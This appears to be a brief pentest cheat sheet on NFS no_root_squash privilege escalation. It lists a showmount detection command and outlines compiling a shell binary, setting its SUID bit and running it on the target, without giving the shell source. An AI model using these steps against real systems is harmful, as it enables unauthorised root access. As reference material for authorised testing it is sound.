# NFS no_root_squash

## Detection

showmount -e <target>

Mount share.

## Exploitation

Create SUID binary.

gcc shell.c -o shell
chmod +s shell

Execute on target.
